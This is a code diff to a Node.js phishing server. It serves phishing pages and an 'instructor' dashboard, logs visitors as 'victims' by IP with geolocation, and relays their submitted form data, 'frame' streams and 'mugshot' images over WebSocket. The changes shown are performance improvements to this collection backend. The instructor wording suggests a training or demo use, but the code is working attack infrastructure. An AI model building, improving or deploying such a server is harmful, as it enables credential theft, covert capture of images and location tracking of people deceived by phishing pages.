@@ -67,10 +67,68 @@ let currentConfig = { ...DEFAULT_CONFIG };
 
 // ── LOGGING ───────────────────────────────────────────────────────────
 function ts() { return new Date().toISOString(); }
+
+const _logBuf = [];
+let _logDraining = false;
+
 function log(msg) {
   const line = `[${ts()}] ${msg}`;
   console.log(line);
-  fs.appendFileSync(LOG_FILE, line + '\n');
+  _logBuf.push(line);
+  if (!_logDraining) {
+    _logDraining = true;
+    setImmediate(flushLog);
+  }
+}
+
+function flushLog() {
+  if (_logBuf.length === 0) { _logDraining = false; return; }
+  const batch = _logBuf.join('\n') + '\n';
+  _logBuf.length = 0;
+  fs.appendFile(LOG_FILE, batch, (err) => {
+    if (err) console.error('[log write error]', err.message);
+    _logDraining = false;
+    if (_logBuf.length > 0) {
+      _logDraining = true;
+      setImmediate(flushLog);
+    }
+  });
+}
+
+// ── GEO LOOKUP CACHE ─────────────────────────────────────────────────
+const geoCache = new Map();
+const GEO_TTL_MS = 60 * 60 * 1000; // 1 hour
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, entry] of geoCache) {
+    if (now > entry.t) geoCache.delete(ip);
+  }
+}, 300_000);
+
+function lookupGeo(ip, onResult) {
+  const cached = geoCache.get(ip);
+  if (cached && cached.v) {
+    onResult(cached.v);
+    return;
+  }
+  if (cached && cached.inflight) { cached.inflight.push(onResult); return; }
+  geoCache.set(ip, { v: null, t: Date.now() + GEO_TTL_MS, inflight: [onResult] });
+  fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,org`)
+    .then(r => r.json())
+    .then(geo => {
+      const rec = geoCache.get(ip);
+      if (rec) {
+        rec.v = geo;
+        rec.t = Date.now() + GEO_TTL_MS;
+        for (const cb of rec.inflight) cb(geo);
+        rec.inflight = [];
+      }
+    })
+    .catch(() => {
+      const rec = geoCache.get(ip);
+      if (rec) { rec.inflight = []; geoCache.delete(ip); }
+    });
 }
 
 // ── DATABASE ──────────────────────────────────────────────────────────
@@ -125,8 +183,14 @@ function broadcastToVictims(payload) {
 }
 
 // ── AUTH THROTTLE ─────────────────────────────────────────────────────
-// Map<ip, { count: number, resetAt: number }>
 const authAttempts = new Map();
+
+setInterval(() => {
+  const now = Date.now();
+  for (const [ip, rec] of authAttempts) {
+    if (now > rec.resetAt) authAttempts.delete(ip);
+  }
+}, 60_000);
 
 function isRateLimited(ip) {
   const now = Date.now();
@@ -146,40 +210,50 @@ function clearAuthRecord(ip) {
 }
 
 // ── UNIFIED HTTP SERVER ──────────────────────────────────────────────
+const staticFiles = {};
+for (const name of ['phish.html', 'phish_stealth.html', 'instructor.html']) {
+  const fp = path.join(__dirname, name);
+  if (fs.existsSync(fp)) staticFiles[name] = fs.readFileSync(fp);
+}
+
+const staticRoutes = {
+  '/':             'phish.html',
+  '/phish':        'phish.html',
+  '/phish.html':   'phish.html',
+  '/stealth':      'phish_stealth.html',
+  '/phish_stealth':      'phish_stealth.html',
+  '/phish_stealth.html': 'phish_stealth.html',
+  '/instructor':        'instructor.html',
+  '/admin':             'instructor.html',
+  '/instructor.html':   'instructor.html',
+};
+
+const stmtListSessions = db.prepare('SELECT DISTINCT session_id FROM victims');
+const stmtSessionVictims = db.prepare('SELECT * FROM victims WHERE session_id = ?');
+
 const server = http.createServer((req, res) => {
   const url = new URL(req.url, `http://${req.headers.host}`);
   const pathname = url.pathname;
 
-  // CORS Helpers
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
 
-  // 1. API Endpoints
   if (pathname === '/api/sessions') {
-    const rows = db.prepare('SELECT DISTINCT session_id FROM victims').all();
+    const rows = stmtListSessions.all();
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end(JSON.stringify({ sessions: rows }));
   }
   if (pathname.startsWith('/api/sessions/')) {
     const sid = pathname.split('/').pop();
-    const rows = db.prepare('SELECT * FROM victims WHERE session_id = ?').all(sid);
+    const rows = stmtSessionVictims.all(sid);
     res.writeHead(200, { 'Content-Type': 'application/json' });
     return res.end(JSON.stringify({ session_id: sid, victims: rows }));
   }
 
-  // 2. Static HTML Serving
-  let filePath = '';
-  if (pathname === '/' || pathname === '/phish' || pathname === '/phish.html') {
-    filePath = path.join(__dirname, 'phish.html');
-  } else if (pathname === '/stealth' || pathname === '/phish_stealth' || pathname === '/phish_stealth.html') {
-    filePath = path.join(__dirname, 'phish_stealth.html');
-  } else if (pathname === '/instructor' || pathname === '/admin' || pathname === '/instructor.html') {
-    filePath = path.join(__dirname, 'instructor.html');
-  }
-
-  if (filePath && fs.existsSync(filePath)) {
+  const file = staticRoutes[pathname];
+  if (file && staticFiles[file]) {
     res.writeHead(200, { 'Content-Type': 'text/html' });
-    return fs.createReadStream(filePath).pipe(res);
+    return res.end(staticFiles[file]);
   }
 
   res.writeHead(404);
@@ -187,8 +261,25 @@ const server = http.createServer((req, res) => {
 });
 
 // ── WEBSOCKET SERVER ──────────────────────────────────────────────────
-const wss = new WebSocketServer({ server });
+const wss = new WebSocketServer({
+  server,
+  perMessageDeflate: {
+    zlibDeflateOptions: { chunkSize: 1024, memLevel: 7, level: 3 }
+  }
+});
 let clientCounter = 0;
+
+// Prune dead sockets so broadcasts don't hit closed connections
+setInterval(() => {
+  for (const ws of victimSockets) {
+    if (ws.readyState === 3) victimSockets.delete(ws);
+  }
+  for (const rooms of instructorRooms.values()) {
+    for (const ins of rooms) {
+      if (ins.readyState === 3) rooms.delete(ins);
+    }
+  }
+}, 30_000);
 
 wss.on('connection', (ws, req) => {
   const ip = (TRUST_PROXY && req.headers['x-forwarded-for']) ? req.headers['x-forwarded-for'].split(',')[0].trim() : req.socket.remoteAddress;
@@ -196,22 +287,20 @@ wss.on('connection', (ws, req) => {
   let clientId = `client_${Date.now()}_${++clientCounter}`;
   let role = 'victim';
   let room = null;
-  let lastFrameAt = 0;  // timestamp of last accepted frame from this client
-  let identityResolved = false; // true once persistentId has been applied
+  let lastFrameAt = 0;
+  let lastDbFrameAt = 0;
+  let identityResolved = false;
 
   victimSockets.add(ws);
   ws.send(JSON.stringify(currentConfig)); // Send current config to new victim
   stmtUpsertVictim.run(clientId, DEFAULT_SESSION, ip, ts());
   log(`[+] CONNECT     ${clientId}  IP=${ip}`);
-  fetch(`http://ip-api.com/json/${ip}?fields=status,city,regionName,country,isp,org`)
-    .then(r => r.json())
-    .then(geo => {
-      if (geo.status === "success") {
-        const geoMsg = { type: "ip_geo", clientId, city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, org: geo.org };
-        broadcastAll(geoMsg);
-      }
-    })
-    .catch(() => {});
+  lookupGeo(ip, (geo) => {
+    if (geo && geo.status === "success") {
+      const geoMsg = { type: "ip_geo", clientId, city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, org: geo.org };
+      broadcastAll(geoMsg);
+    }
+  });
 
   ws.on('message', (raw) => {
     // ── Message size cap ──────────────────────────────────────────────
@@ -277,11 +366,13 @@ wss.on('connection', (ws, req) => {
         stmtUpdateForm.run(JSON.stringify(msg), clientId);
         broadcastAll({ ...msg, clientId, serverIP: ip });
       } else if (msg.type === 'frame') {
-        // ── Frame-rate limiter ─────────────────────────────────────────
         const now = Date.now();
-        if (now - lastFrameAt < FRAME_MIN_MS) return;  // drop frame
+        if (now - lastFrameAt < FRAME_MIN_MS) return;
         lastFrameAt = now;
-        stmtUpdateFrame.run(ts(), clientId);
+        if (now - lastDbFrameAt > 5000) {
+          stmtUpdateFrame.run(ts(), clientId);
+          lastDbFrameAt = now;
+        }
         broadcastAll({ ...msg, clientId, serverIP: ip });
       } else if (msg.type === 'mugshot') {
         // Mugshots are low-frequency (once per session) — always relay
@@ -300,6 +391,7 @@ wss.on('connection', (ws, req) => {
     log(`[-] DISCONNECT  ${clientId}`);
     victimSockets.delete(ws);
     if (role === 'instructor' && room) removeInstructor(ws, room);
+    if (role !== 'instructor') broadcastAll({ type: 'client_disconnect', clientId });
   });
 });
 
